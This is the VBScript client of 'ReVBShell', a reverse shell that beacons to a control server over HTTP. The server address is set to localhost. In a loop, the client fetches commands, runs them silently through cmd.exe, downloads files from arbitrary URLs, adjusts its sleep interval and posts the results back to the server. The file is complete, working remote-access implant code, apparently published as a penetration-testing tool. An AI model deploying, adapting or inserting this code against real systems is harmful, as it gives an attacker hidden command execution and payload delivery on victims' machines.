' this software is provided under under the bsd 3-clause license.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'

Dim arrResponseText, strRawCommand, strCommand, strArgument, strOutFile, strResponse, strPostResponse
Set shell = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Configuration
strHost = "127.0.0.1"
strPort = "8080"
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort

' Periodically poll for commands
While True
    ' Fetch next command
    http.Open "GET", strUrl & "/", False
    http.Send
    strRawCommand = http.ResponseText
    arrResponseText = Split(strRawCommand, " ", 2)

    ' Determine command and arguments
    strCommand = arrResponseText(0)
    strArgument = ""
    If UBound(arrResponseText) > 0 Then
        strArgument = arrResponseText(1)
    End If

    strResponse = ""

    ' Execute command
    Select Case strCommand
        ' Sleep X seconds
        Case "NOOP"
            WScript.Sleep intSleep
        
        ' Set sleep time
        Case "SLEEP"
            intSleep = CInt(strArgument)
            strResponse = "Sleep set to " & strArgument & "ms"
        
        ' Execute command
        Case "SHELL"
            'Execute and write to file
            strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True

            ' Read out file
            Set file = fs.OpenTextFile(strOutfile, 1)
            text = file.ReadAll
            file.Close
            fs.DeleteFile strOutFile, True

            ' Set response
            strResponse = "--------------------------------------------------" & vbCrLf & text & "--------------------------------------------------"

        ' Download a file from a URL
        Case "WGET"
            ' Determine filename
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))

            ' Fetch file
            http.Open "GET", strArgument, False
            http.Send

            ' Write to file
            varByteArray = http.ResponseBody
            Set ts = fs.CreateTextFile(strFilename, True)
            strData = ""
            strBuffer = ""
            For lngCounter = 0 to UBound(varByteArray)
                ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1)))
            Next
            ts.Close

            ' Set response
            strResponse = "File download successful."

        Case "KILL"
            strResponse = "Goodbye!"

        Case Else
            strResponse = "Unknown command"
    End Select

    ' POST results (if any) back
    If strResponse <> "" Then
        strPostResponse = vbCrLf & "> " & strRawCommand & vbCrLf & strResponse & vbCrLf
        http.Open "POST", strUrl & "/", False
        http.Send "result=" & strPostResponse
    End If

    ' Quit on KILL
    If strCommand = "KILL" Then
        WScript.Quit 0
    End If
Wend